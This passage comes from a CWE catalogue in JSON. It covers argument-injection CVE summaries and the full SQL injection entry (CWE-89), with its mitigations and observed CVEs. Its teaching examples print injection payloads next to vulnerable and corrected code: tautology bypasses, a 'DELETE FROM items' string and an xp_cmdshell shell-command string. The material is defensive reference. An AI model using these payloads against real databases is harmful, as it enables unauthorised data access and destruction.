attacker to execute arbitrary OS commands by including crafted arguments to the CLI command."}, {"Reference": "CVE-2022-36069", "Description": "Poetry is a dependency manager for Python. When handling dependencies that come from a Git repository instead of a registry, Poetry uses various commands, such as `git clone`. These commands are constructed using user input (e.g. the repository URL). When building the commands, Poetry correctly avoids Command Injection vulnerabilities by passing an array of arguments instead of a command string. However, there is the possibility that a user input starts with a dash (`-`) and is therefore treated as an optional argument instead of a positional one. This can lead to Code Execution because some of the commands have options that can be leveraged to run arbitrary executables. If a developer is exploited, the attacker could steal credentials or persist their access. If the exploit happens on a server, the attackers could use their access to attack other internal systems. Since this vulnerability requires a fair amount of user interaction, it is not as dangerous as a remotely exploitable one. However, it still puts developers at risk when dealing with untrusted files in a way they think is safe, because the exploit still works when the victim tries to make sure nothing can happen, e.g. by vetting any Git or Poetry config files that might be present in the directory. Versions 1.1.9 and 1.2.0b1 contain patches for this issue."}, {"Reference": "CVE-2022-36804", "Description": "Multiple API endpoints in Atlassian Bitbucket Server and Data Center 7.0.0 before version 7.6.17, from version 7.7.0 before version 7.17.10, from version 7.18.0 before version 7.21.4, from version 8.0.0 before version 8.0.3, from version 8.1.0 before version 8.1.3, and from version 8.2.0 before version 8.2.2, and from version 8.3.0 before 8.3.1 allows remote attackers with read permissions to a public or private Bitbucket repository to execute arbitrary code by sending a malicious HTTP request. This vulnerability was reported via our Bug Bounty Program by TheGrandPew."}, {"Reference": "CVE-2022-37027", "Description": "Ahsay AhsayCBS 9.1.4.0 allows an authenticated system user to inject arbitrary Java JVM options. Administrators that can modify the Runtime Options in the web interface can inject Java Runtime Options. These take effect after a restart. For example, an attacker can enable JMX services and consequently achieve remote code execution as the system user."}, {"Reference": "CVE-2022-3967", "Description": "A vulnerability, which was classified as critical, was found in Vesta Control Panel. Affected is an unknown function of the file func/main.sh of the component sed Handler. The manipulation leads to argument injection. An attack has to be approached locally. The name of the patch is 39561c32c12cabe563de48cc96eccb9e2c655e25. It is recommended to apply a patch to fix this issue. VDB-213546 is the identifier assigned to this vulnerability."}, {"Reference": "CVE-2022-23221", "Description": "H2 Console before 2.1.210 allows remote attackers to execute arbitrary code via a jdbc:h2:mem JDBC URL containing the IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT substring, a different vulnerability than CVE-2021-42392."}, {"Reference": "CVE-2022-24828", "Description": "Composer is a dependency manager for the PHP programming language. Integrators using Composer code to call `VcsDriver::getFileContent` can have a code injection vulnerability if the user can control the `$file` or `$identifier` argument. This leads to a vulnerability on packagist.org for example where the composer.json's `readme` field can be used as a vector for injecting parameters into hg/Mercurial via the `$file` argument, or git via the `$identifier` argument if you allow arbitrary data there (Packagist does not, but maybe other integrators do). Composer itself should not be affected by the vulnerability as it does not call `getFileContent` with arbitrary data into `$file`/`$identifier`. To the best of our knowledge this was not abused, and the vulnerability has been patched on packagist.org and Private Packagist within a day of the vulnerability report."}, {"Reference": "CVE-2022-24066", "Description": "The package simple-git before 3.5.0 are vulnerable to Command Injection due to an incomplete fix of [CVE-2022-24433](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2421199) which only patches against the git fetch attack vector. A similar use of the --upload-pack feature of git is also supported for git clone, which the prior fix didn't cover."}, {"Reference": "CVE-2022-24376", "Description": "All versions of package git-promise are vulnerable to Command Injection due to an inappropriate fix of a prior [vulnerability](https://security.snyk.io/vuln/SNYK-JS-GITPROMISE-567476) in this package. **Note:** Please note that the vulnerability will not be fixed. The README file was updated with a warning regarding this issue."}, {"Reference": "CVE-2022-24437", "Description": "The package git-pull-or-clone before 2.0.2 are vulnerable to Command Injection due to the use of the --upload-pack feature of git which is also supported for git clone. The source includes the use of the secure child process API spawn(). However, the outpath parameter passed to it may be a command-line argument to the git clone command and result in arbitrary command injection."}, {"Reference": "CVE-2022-39243", "Description": "NuProcess is an external process execution implementation for Java. In all the versions of NuProcess where it forks processes by using the JVM's Java_java_lang_UNIXProcess_forkAndExec method (1.2.0+), attackers can use NUL characters in their strings to perform command line injection. Java's ProcessBuilder isn't vulnerable because of a check in ProcessBuilder.start. NuProcess is missing that check. This vulnerability can only be exploited to inject command line arguments on Linux. Version 2.0.5 contains a patch. As a workaround, users of the library can sanitize command strings to remove NUL characters prior to passing them to NuProcess for execution."}, {"Reference": "CVE-2021-46850", "Description": "myVesta Control Panel before 0.9.8-26-43 and Vesta Control Panel before 0.9.8-26 are vulnerable to command injection. An authenticated and remote administrative user can execute arbitrary commands via the v_sftp_license parameter when sending HTTP POST requests to the /edit/server endpoint."}, {"Reference": "CVE-2022-24953", "Description": "The Crypt_GPG extension before 1.6.7 for PHP does not prevent additional options in GPG calls, which presents a risk for certain environments and GPG versions."}]}
{"ID": "89", "Name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Stable", "Diagram": "/data/images/CWE-89-Diagram.png", "Description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "943", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "74", "ViewID": "1003", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Name": "Database Server", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "SQL injection", "Description": "a common attack-oriented phrase"}, {"Term": "SQLi", "Description": "a common abbreviation for \"SQL injection\""}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}, {"Phase": "Implementation", "Note": "This weakness typically appears in data-rich applications that save user inputs in a database."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"], "Note": "Adversaries could execute system commands, typically by changing the SQL statement to redirect output to a file that can then be executed."}, {"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities."}, {"Scope": ["Authentication"], "Impact": ["Gain Privileges or Assume Identity", "Bypass Protection Mechanism"], "Note": "If poor SQL commands are used to check user names and passwords or perform other kinds of authentication, it may be possible to connect to the product as another user with no previous knowledge of the password."}, {"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"], "Note": "If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability."}, {"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "Just as it may be possible to read sensitive information, it is also possible to modify or even delete this information with a SQL injection attack."}], "DetectionMethods": [{"DetectionMethodID": "DM-1", "Method": "Automated Static Analysis", "Description": "\n\nThis weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.\n\n\nAutomated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes.\n\n\nAutomated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.\n", "EffectivenessNotes": "This is not a perfect solution, since 100% accuracy and coverage are not feasible."}, {"DetectionMethodID": "DM-2", "Method": "Automated Dynamic Analysis", "Description": "This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.", "Effectiveness": "Moderate"}, {"DetectionMethodID": "DM-9", "Method": "Manual Analysis", "Description": "Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large."}, {"Method": "Automated Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis", "Effectiveness": "High"}, {"Method": "Dynamic Analysis with Automated Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tDatabase Scanners\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner", "Effectiveness": "High"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source", "Effectiveness": "High"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "High"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-4", "Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.\n"}, {"MitigationID": "MIT-27", "Phase": ["Architecture and Design"], "Strategy": "Parameterization", "Description": "\n\nIf available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.\n\n\nProcess SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using \"exec\" or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]\n"}, {"MitigationID": "MIT-17", "Phase": ["Architecture and Design", "Operation"], "Strategy": "Environment Hardening", "Description": "\n\nRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.\n\n\nSpecifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.\n"}, {"MitigationID": "MIT-15", "Phase": ["Architecture and Design"], "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."}, {"MitigationID": "MIT-28", "Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "\n\nWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).\n\n\nInstead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.\n"}, {"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\n\nWhen constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.\n\n\nNote that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name \"O'Reilly\" would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the \"'\" apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.\n\n\nWhen feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.\n"}, {"MitigationID": "MIT-21", "Phase": ["Architecture and Design"], "Strategy": "Enforcement by Conversion", "Description": "When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs."}, {"MitigationID": "MIT-39", "Phase": ["Implementation"], "Description": "\n\nEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.\n\n\nIf errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.\n\n\nAvoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.\n\n\nIn the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.\n"}, {"MitigationID": "MIT-29", "Phase": ["Operation"], "Strategy": "Firewall", "Description": "Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.", "Effectiveness": "Moderate", "EffectivenessNotes": "An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."}, {"MitigationID": "MIT-16", "Phase": ["Operation", "Implementation"], "Strategy": "Environment Hardening", "Description": "When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code."}]}, {"ID": "DX-209", "Entries": [{"IntroText": "The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user."}, {"Nature": "Bad", "Language": "C#", "ExampleCode": "```\n\t...\n\tstring userName = ctx.getAuthenticatedUserName();\n\tstring query = \"SELECT * FROM items WHERE owner = '\" + userName + \"' AND itemname = '\" + ItemName.Text + \"'\";\n\tsda = new SqlDataAdapter(query, conn);\n\tDataTable dt = new DataTable();\n\tsda.Fill(dt);\n\t...\n```"}, {"BodyText": "The query that this code intends to execute follows:"}, {"Nature": "Informative", "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>;\n```"}, {"BodyText": "However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string:"}, {"Nature": "Attack", "ExampleCode": "```\n\tname' OR 'a'='a\n```"}, {"BodyText": "for itemName, then the query becomes the following:"}, {"Nature": "Attack", "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';\n```"}, {"BodyText": "The addition of the:"}, {"Nature": "Attack", "ExampleCode": "```\n\tOR 'a'='a\n```"}, {"BodyText": "condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:"}, {"Nature": "Attack", "ExampleCode": "```\n\tSELECT * FROM items;\n```"}, {"BodyText": "This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner."}]}, {"Entries": [{"IntroText": "This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example."}, {"BodyText": "If an attacker with the user name wiley enters the string:"}, {"Nature": "Attack", "ExampleCode": "```\n\tname'; DELETE FROM items; --\n```"}, {"BodyText": "for itemName, then the query becomes the following two queries:"}, {"Nature": "Attack", "Language": "SQL", "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';\n\tDELETE FROM items;\n```\n--'*"}, {"BodyText": "Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database."}, {"BodyText": "Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example."}, {"BodyText": "If an attacker enters the string"}, {"Nature": "Attack", "ExampleCode": "```\n\tname'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a\n```"}, {"BodyText": "Then the following three valid statements will be created:"}, {"Nature": "Attack", "ExampleCode": "```\n\tSELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';\n\tDELETE FROM items;\n\tSELECT * FROM items WHERE 'a'='a';\n```"}, {"BodyText": "One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allowlist of safe values or identify and escape a denylist of potentially malicious values. Allowlists can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, denylisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:"}, {"BodyText": "- Target fields that are not quoted\n\n  - Find ways to bypass the need for certain escaped meta-characters\n\n  - Use stored procedures to hide the injected meta-characters."}, {"BodyText": "Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks."}, {"BodyText": "Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example."}, {"Nature": "Bad", "ExampleCode": "```\n\tprocedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2)\n\tis open itm_cv for\n\t' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';\n\tend get_item;\n```"}, {"BodyText": "Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks."}]}, {"Entries": [{"IntroText": "MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form:"}, {"Nature": "Bad", "ExampleCode": "```\n\tSELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE\n```"}, {"BodyText": "Where $user_input is taken from an untrusted source."}, {"BodyText": "If the user provides the string:"}, {"Nature": "Attack", "ExampleCode": "```\n\t'; exec master..xp_cmdshell 'dir' --\n```"}, {"BodyText": "The query will take the following form:"}, {"Nature": "Attack", "ExampleCode": "```\n\tSELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE\n```"}, {"BodyText": "Now, this query can be broken down into:"}, {"BodyText": "1. a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';\n\n  1. a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'\n\n  1. an MS SQL comment: --' ORDER BY PRICE"}, {"BodyText": "As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment."}]}, {"Entries": [{"IntroText": "This code intends to print a message summary given the message ID."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\t$id = $_COOKIE[\"mid\"];\n\tmysql_query(\"SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'\");\n```"}, {"BodyText": "The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser."}, {"BodyText": "While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to:"}, {"Nature": "Attack", "ExampleCode": "```\n\t1432' or '1' = '1\n```"}, {"BodyText": "This would produce the resulting query:"}, {"Nature": "Result", "ExampleCode": "```\n\tSELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'\n```"}, {"BodyText": "Not only will this retrieve message number 1432, it will retrieve all other messages."}, {"BodyText": "In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection:"}, {"Nature": "Good", "Language": "PHP", "ExampleCode": "```\n\t$id = intval($_COOKIE[\"mid\"]);\n\tmysql_query(\"SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'\");\n```"}, {"BodyText": "However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check (CWE-285) to ensure that the application user has the permission to see that message."}]}, {"Entries": [{"IntroText": "This example attempts to take a last name provided by a user and enter it into a database."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\t$userKey = getUserID();\n\t$name = getUserInput();\n```\n# ensure only letters, hyphens and apostrophe are allowed* \n\t$name = allowList($name, \"^a-zA-z'-$\");\n\t$query = \"INSERT INTO last_names VALUES('$userKey', '$name')\";"}, {"BodyText": "While the programmer applies an allowlist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens, which are used as comment structures in SQL. If a user specifies \"--\" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations."}]}], "ObservedExamples": [{"Reference": "CVE-2023-32530", "Description": "SQL injection in security product dashboard using crafted certificate fields", "Link": "https://www.cve.org/CVERecord?id=CVE-2023-32530"}, {"Reference": "CVE-2021-42258", "Description": "SQL injection in time and billing software, as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-42258"}, {"Reference": "CVE-2021-27101", "Description": "SQL injection in file-transfer system via a crafted Host header, as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2021-27101"}, {"Reference": "CVE-2020-12271", "Description": "SQL injection in firewall product's admin interface or user portal, as exploited in the wild per CISA KEV.", "Link": "https://www.cve.org/CVERecord?id=CVE-2020-12271"}, {"Reference": "CVE-2019-3792", "Description": "An automation system written in Go contains an API that is vulnerable to SQL injection allowing the attacker to read privileged data.", "Link": "https://www.cve.org/CVERecord?id=CVE-2019-3792"}, {"Reference": "CVE-2004-0366", "Description": "chain: SQL injection in library intended for database authentication allows SQL injection and authentication bypass.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0366"}, {"Reference": "CVE-2008-2790", "Description": "SQL injection through an ID that was supposed to be numeric.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2790"}, {"Reference": "CVE-2008-2223", "Description": "SQL injection through an ID that was supposed to be numeric.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2223"}, {"Reference": "CVE-2007-6602", "Description": "SQL injection via user name.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6602"}, {"Reference": "CVE-2008-5817", "Description": "SQL injection via user name or password fields.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5817"}, {"Reference": "CVE-2003-0377", "Description": "SQL injection in security product, using a crafted group name.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0377"}, {"Reference": "CVE-2008-2380", "Description": "SQL injection in authentication library.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-2380"}, {"Reference": "CVE-2017-11508", "Description": "SQL injection in vulnerability management and reporting tool, using a crafted password.", "Link": "https://www.cve.org/CVERecord?id=CVE-2017-11508"}], "RelatedAttackPatterns": ["108", "109", "110", "470", "66", "7"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "SQL injection can be resultant from special character mismanagement, MAID, or denylist/allowlist problems. It can be primary to authentication errors."}], "Top25Examples": [{"Reference": "CVE-2021-26634", "Description": "SQL injection and file upload attacks are possible due to insufficient validation of input values in some parameters and variables of files compromising Maxboard, which may lead to arbitrary code execution or privilege escalation. Attackers can use these vulnerabilities to perform attacks such as stealing server management rights using a web shell."}, {"Reference": "CVE-2021-3935", "Description": "When PgBouncer is configured to use \"cert\" authentication, a man-in-the-middle attacker can inject arbitrary SQL queries when a connection is first established, despite the use of TLS certificate verification and encryption. This flaw affects PgBouncer versions prior to 1.16.1."}, {"Reference": "CVE-2021-41433", "Description": "SQL Injection vulnerability exists in version 1.0 of the Resumes Management and Job Application Website application login form by EGavilan Media that allows authentication bypass through login.php."}, {"Reference": "CVE-2022-0366", "Description": "An authenticated and authorized agent user could potentially gain administrative access via an SQLi vulnerability to Capsule8 Console between versions 4.6.0 and 4.9.1."}, {"Reference": "CVE-2022-0439", "Description": "The Email Subscribers & Newsletters WordPress plugin before 5.3.2 does not correctly escape the `order` and `orderby` parameters to the `ajax_fetch_report_list` action, making it vulnerable to blind SQL injection attacks by users with roles as low as Subscriber. Further, it does not have any CSRF protection in place for the action, allowing an attacker to trick any logged in user to perform the action by clicking a link."}, {"Reference": "CVE-2022-0479", "Description": "The Popup Builder WordPress plugin before 4.1.1 does not sanitise and escape the sgpb-subscription-popup-id parameter before using it in a SQL statement in the All Subscribers admin dashboard, leading to a SQL injection, which could also be used to perform Reflected Cross-Site Scripting attack against a logged in admin opening a malicious link"}, {"Reference": "CVE-2022-21647", "Description": "CodeIgniter is an open source PHP full-stack web framework. Deserialization of Untrusted Data was found in the `old()` function in CodeIgniter4. Remote attackers may inject auto-loadable arbitrary objects with this vulnerability, and possibly execute existing PHP code on the server. We are aware of a working exploit, which can lead to SQL injection. Users are advised to upgrade to v4.1.6 or later. Users unable to upgrade as advised to not use the `old()` function and form_helper nor `RedirectResponse::withInput()` and `redirect()->withInput()`."}, {"Reference": "CVE-2022-22735", "Description": "The Simple Quotation WordPress plugin through 1.3.2 does not have authorisation (and CSRF) checks in various of its AJAX actions and is lacking escaping of user data when using it in SQL statements, allowing any authenticated users, such as subscriber to perform SQL injection attacks"}, {"Reference": "CVE-2022-23857", "Description": "model/criteria/criteria.go in Navidrome before 0.47.5 is vulnerable to SQL injection attacks when processing crafted Smart Playlists. An authenticated user could abuse this to extract arbitrary data from the database, including the user table (which contains sensitive information such as the users' encrypted passwords)."}, {"Reference": "CVE-2022-24690", "Description": "An issue was discovered in DSK DSKNet 2.16.136.0 and 2.17.136.5. A PresAbs.php SQL Injection vulnerability allows unauthenticated users to taint database data and extract sensitive information via crafted HTTP requests. The type of SQL Injection is blind boolean based. (An unauthenticated attacker can discover the endpoint by abusing a Broken Access Control issue with further SQL injection attacks to gather all user's badge numbers and PIN codes.)"}, {"Reference": "CVE-2022-29603", "Description": "A SQL Injection vulnerability exists in UniverSIS UniverSIS-API through 1.2.1 via the $select parameter to multiple API endpoints. A remote authenticated attacker could send crafted SQL statements to a vulnerable endpoint (such as /api/students/me/messages/) to, for example, retrieve personal information or change grades."}, {"Reference": "CVE-2022-29652", "Description": "Online Sports Complex Booking System 1.0 is vulnerable to SQL Injection via /scbs/classes/Users.php?f=save_client."}, {"Reference": "CVE-2022-30335", "Description": "Bonanza Wealth Management System (BWM) 7.3.2 allows SQL injection via the login form. Users who supply the application with a SQL injection payload in the User Name textbox could collect all passwords in encrypted format from the Microsoft SQL Server component."}, {"Reference": "CVE-2022-36669", "Description": "Hospital Information System version 1.0 suffers from a remote SQL injection vulnerability that allows for authentication bypass."}, {"Reference": "CVE-2022-39056", "Description": "RAVA certificate validation system has insufficient validation for user input. 